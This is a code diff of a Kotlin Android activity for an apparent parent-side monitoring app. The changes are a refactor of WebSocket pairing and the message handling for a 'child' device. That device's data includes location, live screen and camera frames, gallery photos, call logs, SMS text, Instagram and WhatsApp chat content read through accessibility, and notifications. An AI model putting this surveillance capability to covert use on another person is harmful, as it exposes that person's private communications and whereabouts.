@@ -16,7 +16,7 @@ import org.json.JSONObject
 class MainActivity : AppCompatActivity() {
 
     var wsManager: WebSocketManager? = null
-    private lateinit var adapter: ViewPagerAdapter
+    lateinit var adapter: ViewPagerAdapter
     private lateinit var statusDot: View
     private lateinit var tvStatus: TextView
     private lateinit var tvBattery: TextView
@@ -24,20 +24,26 @@ class MainActivity : AppCompatActivity() {
     private val handler = Handler(Looper.getMainLooper())
     private var wifiOn = true
 
+    companion object {
+        const val PREFS_NAME    = "config"
+        const val KEY_SERVER_URL = "server_url"
+        const val KEY_PAIR_CODE  = "pair_code"
+        const val DEFAULT_URL   = "wss://your-app.replit.app/api/ws"
+    }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        statusDot  = findViewById(R.id.statusDot)
-        tvStatus   = findViewById(R.id.tvStatus)
-        tvBattery  = findViewById(R.id.tvBattery)
-        tvPing     = findViewById(R.id.tvPing)
+        statusDot = findViewById(R.id.statusDot)
+        tvStatus  = findViewById(R.id.tvStatus)
+        tvBattery = findViewById(R.id.tvBattery)
+        tvPing    = findViewById(R.id.tvPing)
 
         setupViewPager()
         connectWebSocket()
         startPingTicker()
 
-        // NET toggle — send command to turn wifi on/off on child
         findViewById<Button>(R.id.btnNetToggle).setOnClickListener {
             if (wifiOn) {
                 wsManager?.sendCommand("wifi_off")
@@ -59,19 +65,21 @@ class MainActivity : AppCompatActivity() {
         val vp = findViewById<ViewPager2>(R.id.viewPager)
         vp.adapter = adapter
         vp.offscreenPageLimit = 5
-
         val tabs = listOf("📊 Dash", "📹 Live", "📂 Data", "🎮 Control", "🔔 Notifs", "⚙️ Settings")
         TabLayoutMediator(
             findViewById(R.id.tabLayout), vp
         ) { tab, pos -> tab.text = tabs[pos] }.attach()
     }
 
-    private fun connectWebSocket() {
-        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
-        val url = prefs.getString("server_url", "wss://your-relay.replit.app/ws")!!
+    fun connectWebSocket() {
+        val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val url      = prefs.getString(KEY_SERVER_URL, DEFAULT_URL)!!
+        val pairCode = prefs.getString(KEY_PAIR_CODE, "")!!
 
+        wsManager?.disconnect()
         wsManager = WebSocketManager(
             serverUrl    = url,
+            pairCode     = pairCode,
             onConnected  = { runOnUiThread { setServerOnline() } },
             onDisconnected = { runOnUiThread { setServerOffline() } },
             onMessage    = { data -> runOnUiThread { handleMessage(data) } }
@@ -81,17 +89,10 @@ class MainActivity : AppCompatActivity() {
 
     private fun handleMessage(data: JSONObject) {
         when (data.optString("type")) {
-
-            // ── Status ──────────────────────────────────────────────────────
             "status" -> {
-                if (data.optBoolean("child_online")) {
-                    adapter.dashboardFragment.setChildOnline()
-                } else {
-                    adapter.dashboardFragment.setChildOffline()
-                }
+                if (data.optBoolean("child_online")) adapter.dashboardFragment.setChildOnline()
+                else adapter.dashboardFragment.setChildOffline()
             }
-
-            // ── Battery ──────────────────────────────────────────────────────
             "battery" -> {
                 val lvl = data.optInt("battery", -1)
                 if (lvl >= 0) {
@@ -99,42 +100,24 @@ class MainActivity : AppCompatActivity() {
                     adapter.dashboardFragment.updateBattery(lvl)
                 }
             }
-
-            // ── Location ─────────────────────────────────────────────────────
             "location" -> {
                 val lat = data.optDouble("lat"); val lng = data.optDouble("lng")
                 adapter.dashboardFragment.updateLocation(lat, lng)
             }
-
-            // ── Current app ──────────────────────────────────────────────────
             "current_app" -> {
                 val pkg = data.optString("package")
                 adapter.dashboardFragment.updateCurrentApp(pkg)
             }
-
-            // ── Screen live frame ────────────────────────────────────────────
             "screen_frame" -> {
                 adapter.dashboardFragment.setChildOnline()
                 adapter.liveFragment.onScreenFrame(data.optString("frame"))
             }
-
-            // ── Camera live frame ────────────────────────────────────────────
             "camera_frame" -> {
                 adapter.dashboardFragment.setChildOnline()
                 adapter.liveFragment.onCameraFrame(data.optString("frame"))
             }
-
-            // ── Photo (single shot) ──────────────────────────────────────────
-            "photo" -> {
-                adapter.liveFragment.onCameraFrame(data.optString("image"))
-            }
-
-            // ── Gallery ──────────────────────────────────────────────────────
-            "gallery" -> {
-                adapter.dataFragment.onGallery(data.optJSONArray("photos") ?: return)
-            }
-
-            // ── Calls ────────────────────────────────────────────────────────
+            "photo" -> adapter.liveFragment.onCameraFrame(data.optString("image"))
+            "gallery" -> adapter.dataFragment.onGallery(data.optJSONArray("photos") ?: return)
             "call_log" -> {
                 adapter.dataFragment.onList("Calls", data.optJSONArray("calls") ?: return) { c ->
                     val t = c.optString("type")[0].uppercaseChar()
@@ -142,31 +125,23 @@ class MainActivity : AppCompatActivity() {
                     "[$t] ${c.optString("number")}  ${c.optString("name")}  ${dur}s"
                 }
             }
-
-            // ── SMS ──────────────────────────────────────────────────────────
             "sms" -> {
                 adapter.dataFragment.onList("SMS", data.optJSONArray("messages") ?: return) { m ->
                     val t = if (m.optString("type") == "inbox") "📥" else "📤"
                     "$t ${m.optString("from")}  ${m.optString("body").take(60)}"
                 }
             }
-
-            // ── App usage ────────────────────────────────────────────────────
             "app_usage" -> {
                 adapter.dataFragment.onList("Apps", data.optJSONArray("stats") ?: return) { s ->
                     val mins = s.optLong("totalTime") / 60000
                     "${s.optString("package").substringAfterLast('.')}  — ${mins}min"
                 }
             }
-
-            // ── App opened (from accessibility) ──────────────────────────────
             "app_open" -> {
                 val pkg = data.optString("package")
                 adapter.dashboardFragment.updateCurrentApp(pkg)
                 adapter.dashboardFragment.setChildOnline()
             }
-
-            // ── Chat content (Instagram/WhatsApp) ────────────────────────────
             "chat_content" -> {
                 val pkg = data.optString("package").substringAfterLast('.')
                 val content = data.optString("content").take(200)
@@ -175,8 +150,6 @@ class MainActivity : AppCompatActivity() {
                         .format(java.util.Date()))
                 adapter.notifFragment.adapter.addNotification(item)
             }
-
-            // ── Notifications ────────────────────────────────────────────────
             "notification" -> {
                 val item = NotificationItem(
                     app   = data.optString("app", "?"),
@@ -187,8 +160,6 @@ class MainActivity : AppCompatActivity() {
                 adapter.notifFragment.adapter.addNotification(item)
                 vibrate()
             }
-
-            // ── Permissions result ───────────────────────────────────────────
             "permissions_result" -> {
                 val count = data.optInt("granted")
                 val shizuku = data.optBoolean("shizuku_available")
